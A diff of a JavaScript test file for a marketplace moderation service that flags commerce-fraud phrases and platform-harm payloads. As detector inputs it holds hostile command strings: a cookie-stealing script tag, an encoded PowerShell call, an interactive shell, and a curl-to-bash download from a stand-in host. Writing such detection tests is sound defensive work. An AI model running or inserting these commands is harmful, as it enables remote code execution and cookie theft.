@@ -164,21 +164,31 @@ describe('CLI V2 Modular & Security Verifications', () => {
     assert.strictEqual(guardProtectedLounge(99, 'delete'), true);
   });
 
-  it('detects zero-tolerance keywords accurately', async () => {
+  it('detects commerce fraud phrases with word boundaries', async () => {
     const { moderationService } = await import('../../server/v2/services/moderationService.js');
-    assert.strictEqual(moderationService.detectZeroToleranceViolation('Attempting chargeback fraud on escrow'), 'chargeback');
-    assert.strictEqual(moderationService.detectZeroToleranceViolation('Check this phishing link'), 'phishing');
-    assert.strictEqual(moderationService.detectZeroToleranceViolation('Installing keylogger on target'), 'keylogger');
-    assert.strictEqual(moderationService.detectZeroToleranceViolation('Normal friendly message here'), null);
+    assert.strictEqual(moderationService.detectCommerceFraudSignal('Attempting chargeback fraud on escrow'), 'chargeback');
+    assert.strictEqual(moderationService.detectCommerceFraudSignal('Installing keylogger on target'), 'keylogger');
+    assert.strictEqual(moderationService.detectCommerceFraudSignal('Normal friendly message here'), null);
+    assert.strictEqual(moderationService.detectCommerceFraudSignal('battery drain tip for phones'), null);
+    assert.strictEqual(moderationService.detectCommerceFraudSignal('Check this phishing link'), null);
+    assert.ok(moderationService.detectCommerceFraudSignal('selling phishing kit today'));
   });
 
-  it('detects and drops malicious executable scripts and payloads', async () => {
+  it('detects platform-harm payloads without generic JS false positives', async () => {
     const { moderationService } = await import('../../server/v2/services/moderationService.js');
-    assert.ok(moderationService.detectMaliciousPayload('<script>document.cookie</script>'));
-    assert.ok(moderationService.detectMaliciousPayload('const x = eval("1+1");'));
-    assert.ok(moderationService.detectMaliciousPayload('powershell.exe -enc dGVzdA=='));
-    assert.ok(moderationService.detectMaliciousPayload('/bin/sh -i'));
-    assert.strictEqual(moderationService.detectMaliciousPayload('Standard safe listing title and description'), null);
+    assert.ok(moderationService.detectPlatformHarm('<script>document.cookie</script>'));
+    assert.ok(moderationService.detectPlatformHarm('powershell.exe -enc dGVzdA=='));
+    assert.ok(moderationService.detectPlatformHarm('/bin/sh -i'));
+    assert.ok(moderationService.detectPlatformHarm('curl https://evil.test/x.sh | bash'));
+    assert.strictEqual(moderationService.detectPlatformHarm('const x = eval("1+1");'), null);
+    assert.strictEqual(moderationService.detectPlatformHarm('Standard safe listing title and description'), null);
+    assert.strictEqual(moderationService.detectPlatformHarm('exploit guide discussion'), null);
+  });
+
+  it('legacy aliases still resolve to the new scanners', async () => {
+    const { moderationService } = await import('../../server/v2/services/moderationService.js');
+    assert.ok(moderationService.detectMaliciousPayload('<script>x</script>'));
+    assert.strictEqual(moderationService.detectZeroToleranceViolation('chargeback scam'), 'chargeback');
   });
 
   it('generates clean bot message templates without ASCII border noise', async () => {
